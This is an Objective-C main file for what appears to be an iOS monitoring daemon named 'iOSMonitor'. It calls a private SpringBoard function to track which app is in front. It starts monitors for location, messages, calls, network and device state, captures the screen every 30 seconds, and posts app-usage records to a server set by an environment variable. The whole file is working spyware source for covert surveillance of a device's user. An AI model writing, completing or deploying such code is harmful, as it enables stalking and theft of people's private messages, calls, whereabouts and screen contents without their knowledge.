#import "include/monitor.h"
#import <dlfcn.h>

static NSString *lastFrontApp = nil;
static NSTimeInterval lastAppChangeTime = 0;

static void monitorFrontmostApp(void) {
    void *handle = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_LAZY);
    if (!handle) return;

    CFStringRef (*SBSCopyFrontmostApplicationDisplayIdentifier)(void) =
        dlsym(handle, "SBSCopyFrontmostApplicationDisplayIdentifier");
    if (!SBSCopyFrontmostApplicationDisplayIdentifier) {
        dlclose(handle);
        return;
    }

    NSString *bundleID = (__bridge_transfer NSString *)SBSCopyFrontmostApplicationDisplayIdentifier();
    if (!bundleID) bundleID = @"unknown";

    NSTimeInterval now = [[NSDate date] timeIntervalSince1970];

    if (![bundleID isEqualToString:lastFrontApp]) {
        if (lastFrontApp && (now - lastAppChangeTime) > 2) {
            [[HTTPClient sharedClient] post:@"app_usage" params:@{
                @"app_name": lastFrontApp,
                @"bundle_id": lastFrontApp,
                @"duration": @((int)(now - lastAppChangeTime))
            }];
        }
        lastFrontApp = bundleID;
        lastAppChangeTime = now;
        [[HTTPClient sharedClient] post:@"app_usage" params:@{
            @"app_name": bundleID,
            @"bundle_id": bundleID,
            @"duration": @0
        }];
        NSLog(@"[iOSMonitor] Frontmost app: %@", bundleID);
    }

    dlclose(handle);
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        NSString *serverURL = [[NSProcessInfo processInfo] environment][@"SERVER_URL"];
        if (serverURL) {
            [HTTPClient sharedClient].serverURL = serverURL;
            NSLog(@"[iOSMonitor] Server URL: %@", serverURL);
        }

        LocationMonitor *loc = [[LocationMonitor alloc] init];
        [loc start];

        MessageMonitor *msg = [[MessageMonitor alloc] init];
        [msg start];

        ScreenCapture *sc = [[ScreenCapture alloc] init];
        [sc startCaptureWithInterval:30.0];

        CallMonitor *call = [[CallMonitor alloc] init];
        [call start];

        NetworkMonitor *net = [[NetworkMonitor alloc] init];
        [net start];

        DeviceMonitor *dev = [[DeviceMonitor alloc] init];
        [dev start];

        // Poll frontmost app every 5 seconds
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
            while (YES) {
                @autoreleasepool {
                    monitorFrontmostApp();
                }
                [NSThread sleepForTimeInterval:5.0];
            }
        });

        dispatch_main();
    }
    return 0;
}
